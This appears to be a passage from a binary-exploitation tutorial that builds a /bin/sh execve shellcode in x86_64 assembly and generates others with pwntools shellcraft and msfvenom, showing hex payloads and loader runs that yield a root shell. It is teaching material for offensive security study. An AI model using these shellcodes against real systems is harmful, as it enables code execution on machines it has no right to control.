# Shellcoding Tools

We should now be able to modify our code and make it shellcode compatible, such that it meets all Shellcoding Requirements. This understanding is crucial for crafting our own shellcodes and minimizing their size, which may become very handy when dealing with Binary Exploitation, especially when we don't have a lot of room for a large shellcode.

In certain other cases, we may not need to write our own shellcode every time, as a similar shellcode may already exist, or we can use tools to generate our shellcode, so we don't have to reinvent the wheel.

We will come across many common shellcodes through Binary Exploitation, like a Reverse Shell shellcode or a /bin/sh shellcode. We can find many shellcodes that perform these functions, which we may be able to use with minimal or no modification. We can also use tools to generate both of these shellcodes.

For either of these, we must be sure to use a shellcode that matches our target Operating System and Processor Architecture.

## Shell Shellcode

Before we continue with tools and online resources, let's try to craft our own /bin/sh shellcode. To do so, we can use the execve syscall with syscall number 59, which allows us to execute a system application:

```

z0x9n@htb[/htb]$ man -s 2 execve

int execve(const char *pathname, char *const argv[], char \*const envp[]);

```

As we can see, the execve syscall accepts 3 arguments. We need to execute `/bin/sh /bin/sh`, which would drop us in a sh shell. So, we our final function to be:

```c
execve("/bin//sh", ["/bin//sh"], NULL)
```

So, we'll set our arguments as:

- rax -> 59 (execve syscall number)
- rdi -> ['/bin//sh'] (pointer to program to execute)
- rsi -> ['/bin//sh'] (list of pointers for arguments)
- rdx -> NULL (no environment variables)

Note: We added an extra / in '/bin//sh' so that the total character count is 8, which fills up a 64-bit register, so we don't have to worry about clearing the register beforehand or dealing with any leftovers. Any extra slashes are ignored in Linux, so this is a handy trick to even the total character count when needed, and it is used a lot in binary exploitation.

Using the same concepts we learned for calling a syscall, the following assembly code should execute the syscall we need:

```nasm
global _start

section .text
_start:
    mov rax, 59         ; execve syscall number
    push 0              ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push 0              ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    mov rdx, 0          ; set env to NULL
    syscall
```

As we can see, we pushed two (NULL-terminated) '/bin//sh' strings and then moved their pointers to rdi and rsi. We should know by now that the above assembly code will not produce a working shellcode since it contains NULL bytes.

Try to remove all NULL bytes from the above assembly code to produce a working shellcode.

Once we fix our code, we can run `shellcoder.py` on it, and have a shellcode with no NULL bytes:

```
z0x9n@htb[/htb]$ python3 shellcoder.py sh

b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 bytes - No NULL bytes
```

Try running the above shellcode with `loader.py` to see if it works and drops us in a shell. Now let's try to get another shellcode for /bin/sh, using shellcode generation tools.

## Shellcraft

Let's start with our usual tools, pwntools, and use its shellcraft library, which generates a shellcode for various syscalls. We can list syscalls the tool accepts as follows:

```
z0x9n@htb[/htb]$ pwn shellcraft -l 'amd64.linux'

...SNIP...
amd64.linux.sh
```

We see the `amd64.linux.sh` syscall, which would drop us into a shell like our above shellcode. We can generate its shellcode as follows:

```
z0x9n@htb[/htb]$ pwn shellcraft amd64.linux.sh

6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
```

Note that this shellcode is not as optimized and short as our shellcode. We can run the shellcode by adding the `-r` flag:

```
z0x9n@htb[/htb]$ pwn shellcraft amd64.linux.sh -r

$ whoami

root
```

And it works as expected. Furthermore, we can use the Python3 interpreter to unlock shellcraft fully and use advanced syscalls with arguments. First, we can list all available syscalls with `dir(shellcraft)`, as follows:

```
z0x9n@htb[/htb]$ python3

>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> dir(shellcraft)

[...SNIP... 'execve', 'exit', 'exit_group', ... SNIP...]
```

Let's use the execve syscall like we did above to drop in a shell, as follows:

```
>>> syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) # syscall and args
>>> asm(syscall).hex() # print shellcode

'48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'
```

We can find a complete list of x86_64 accepted syscalls and their arguments on [this link](https://docs.pwntools.com/en/stable/shellcraft.html#pwnlib.shellcraft.amd64.linux). We can now try running this shellcode with `loader.py`:

```
z0x9n@htb[/htb]$ python3 loader.py '48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'

$ whoami

root
```

And it works as expected.

## Msfvenom

Let's try msfvenom, which is another common tool we can use for shellcode generation. Once again, we can list various available payloads for Linux and x86_64 with:

```
z0x9n@htb[/htb]$ msfvenom -l payloads | grep 'linux/x64'

linux/x64/exec                                      Execute an arbitrary command
...SNIP...
```

The `exec` payload allows us to execute a command we specify. Let's pass `'/bin/sh/'` for the `CMD`, and test the shellcode we get:

```
z0x9n@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of hex file: 96 bytes
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05
```

Note that this shellcode is also not as optimized and short as our shellcode. Let's try running this shellcode with our `loader.py` script:

```
z0x9n@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736
```
